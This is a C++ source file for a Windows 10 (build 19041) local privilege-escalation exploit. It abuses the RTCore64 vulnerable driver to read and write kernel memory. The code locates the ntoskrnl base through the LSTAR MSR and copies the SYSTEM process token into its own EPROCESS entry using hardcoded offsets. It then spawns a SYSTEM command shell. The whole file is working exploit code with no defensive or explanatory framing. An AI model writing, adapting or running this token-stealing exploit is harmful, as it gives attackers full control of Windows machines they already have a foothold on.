#include "sdk.h"
#include <iostream>

/*
	Windows 10 Kernel Version 19041  x64
	Hardcoded offset !
*/

#define MSR_LSTAR				0xc0000082 // long mode SYSCALL target
#define PAGE_SIZE				4096

/* Warning : Hardcoded offset !! */
namespace offset
{
	constexpr DWORD oMsrLstarDistance{ 0x400000 };
	constexpr DWORD oPsInitialSystemProcess{ 0xCFC420 };
	constexpr DWORD oUniqueProcessId{ 0x440 };
	constexpr DWORD oActiveProcessLinks{ 0x448 };
	constexpr DWORD oToken{ 0x4b8 };
}

// Locate ntoskrnl without relying on winAPI like EnumDeviceDrivers()
// Warning: It may not be reliable in a production environment
uintptr_t locateNtoskrnl(const HANDLE _In_& hDevice)
{
	BOOL status;
	uintptr_t addr = sdk::readMSR(hDevice, MSR_LSTAR, status);
	addr &= 0xFFFFFFFFFFF00000; // round up to the current allocation granularity 
	addr -= offset::oMsrLstarDistance; // get ntoskrnl base

	return addr;
}

// Read the Token pointer contained inside the EPROCESS structure of the system process
uintptr_t getSystemToken(const HANDLE _In_& hDevice, const uintptr_t _In_& kernelBase)
{
	BOOL status;

	uintptr_t systemEprocess = sdk::readMemory<uintptr_t>(hDevice, (PVOID)(kernelBase + offset::oPsInitialSystemProcess), status);

	return sdk::readMemory<uintptr_t>(hDevice, (PVOID)(systemEprocess + offset::oToken), status);

}

// Replace the Token pointer of current process
void WriteToken(const HANDLE _In_& hDevice,const uintptr_t _In_& kernelBase, const uintptr_t _In_& pToken)
{
	BOOL status;
	const DWORD currentPID = GetCurrentProcessId();
	DWORD _pid{};

	uintptr_t systemEprocess = sdk::readMemory<uintptr_t>(hDevice, (PVOID)(kernelBase + offset::oPsInitialSystemProcess), status);

	uintptr_t activeProcessEntry = sdk::readMemory<uintptr_t>(hDevice, (PVOID)(systemEprocess + offset::oActiveProcessLinks), status);

	// Search for this pid in the EPROCESS system list (ActiveProcessLinks)
	while (_pid != currentPID)
	{
		// Get the next entry in the PsInitialSystemProcess linked list 
		activeProcessEntry = sdk::readMemory<uintptr_t>(hDevice, (PVOID)(activeProcessEntry), status);

		// Get the pid of the current process entry 
		_pid = sdk::readMemory<DWORD>(hDevice, (PVOID)(activeProcessEntry - offset::oActiveProcessLinks + offset::oUniqueProcessId), status);
	}

	// activeProcessEntry entry is the current process 
	sdk::writeMemory<uintptr_t>(hDevice, (PVOID)(activeProcessEntry - offset::oActiveProcessLinks + offset::oToken), (uintptr_t)pToken, status);


}

BOOL spawnShell()
{
	STARTUPINFOW si{};
	PROCESS_INFORMATION pi{};

	const wchar_t WS_NAME[]{ L"C:\\Windows\\System32\\cmd.exe" };

	BOOL status =
		CreateProcess(WS_NAME, NULL, NULL, NULL, FALSE,
			NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT,
			nullptr, NULL, &si, &pi);


	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return status;
}


int main(int argc, char** argv)
{
	BOOL status;
	HANDLE hDevice = sdk::getRTCoreHandle();


	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cerr << "[*] Invalid Handle !! : " << GetLastError() << "\n";
		return EXIT_FAILURE;

	}
	
	std::cout << "[+] Handle to the device object RTCore64 obtained !" << "\n";

	uintptr_t kernelBase = locateNtoskrnl(hDevice); 

	std::cout << "[+] Kernel Base : " << std::hex << kernelBase << "\n";

	uintptr_t pToken = getSystemToken(hDevice, kernelBase);

	std::cout << "[+] System Token ptr : " << std::hex << pToken << "\n";
	
	WriteToken(hDevice, kernelBase, pToken);

	std::cout << "[+] Spawning a system shell !! : " << "\n\n";
	
	status = spawnShell();

	if (status == FALSE) {
		std::cerr << "Process creation failed\nError : " << GetLastError() << "\n";
		ExitProcess(EXIT_FAILURE);
	}

	CloseHandle(hDevice);

	return EXIT_SUCCESS;
}
